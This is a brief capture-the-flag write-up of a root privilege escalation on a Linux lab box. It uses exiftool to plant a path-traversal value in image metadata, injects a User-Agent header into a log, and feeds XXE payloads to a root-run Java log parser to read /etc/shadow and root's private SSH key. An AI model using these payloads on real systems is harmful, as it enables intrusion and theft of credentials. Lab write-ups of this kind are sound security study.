# Exploitation XXE linux system
<hr>

First create the necessary image inserting an appropriate path for the exploit.

Use `exiftool` to generate the exploit image. Having in mind that this step will determine the path of the XML file to be parsed and the path has to be relative to the `/credits` folder and pass it to the server.

```
exiftool -artist="../tmp/exploit" exploit.jpg
```

Next create the XML file that will be parsed.

`/tmp/exploit_creds.xml`
```XML
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

Last but not least the `redpanda.log` file must be injected with the right path to the exploit image, by simply requesting it in the web application. Inject the `User-Agent` header as follows:

![[user_agent_inj.png]]

Then check the log file

![[log.png]]

Once the string is splitted the URI will be parsed from the log (note the extra `/`).

Now execute the `credit_score` application by running:

```bash
cd /opt/credit-score/LogParser/final/target
java -jar final-1.0-jar-with-dependencies.jar 
```

The app will throw an error but running it is useful to debug how the app is parsing the PATH, in the end check the `exploit_creds.xml` file and the contents of `/etc/shadow` will be there. The root password seemed hard to crack to let's try to obtain for instance the private SSH key, changing the XML file as follows:

```XML
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

After some time (root ran the the functionality) the root ssh key was there.

![[root_ssh_key.png]]

Capture the root flag.







